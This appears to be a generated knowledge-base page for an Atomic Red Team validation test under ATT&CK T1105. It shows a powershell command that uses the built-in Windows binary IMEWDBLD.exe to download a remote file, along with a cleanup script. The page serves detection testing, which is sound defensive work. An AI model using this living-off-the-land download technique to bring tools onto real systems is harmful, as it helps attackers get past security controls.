---
atomic_guid: "1a02df58-09af-4064-a765-0babe1a0d1e2"
title: "Download a file with IMEWDBLD.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "1a02df58-09af-4064-a765-0babe1a0d1e2"
  - "Download a file with IMEWDBLD.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Download a file with IMEWDBLD.exe

Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.

## Metadata

- Atomic GUID: 1a02df58-09af-4064-a765-0babe1a0d1e2
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### file_name

- description: Name of the file to be downloaded without extension.
- type: string
- default: T1105

### remote_url

- description: Location of file to be downloaded.
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml

## Executor

- name: powershell

### Command

```powershell
$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
& $imewdbled #{remote_url}
```

### Cleanup

```powershell
$inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
